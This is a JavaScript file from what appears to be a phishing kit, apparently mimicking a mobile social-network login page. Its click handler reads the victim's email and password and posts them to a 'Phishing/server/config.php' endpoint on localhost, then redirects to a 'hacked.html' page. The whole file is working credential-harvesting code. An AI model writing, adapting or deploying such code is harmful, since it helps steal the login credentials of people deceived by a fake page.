"use strict";

function Selector (tag) {
    return document.querySelector(tag);
}
var login = Selector("#login");

login.onclick = (e)=> {
    e.preventDefault();
    var email = Selector("#m_login_email").value;
    var password = Selector("#password").value;
    if (email && password) {
        var form = new FormData();
        form.append("email", email);
        form.append("password", password);
        fetch('http://localhost:8080/Phishing/server/config.php', {
            method: "POST",
            body: form,
        })
        .then((res)=> {
            return res.json();
        })
        .then((data)=> {
            if(data.status==10100){
                window.location.href = "hacked.html";
            }
        });
    } else {
        window.location.href = "http://localhost:8080/Phishing/";
    }
}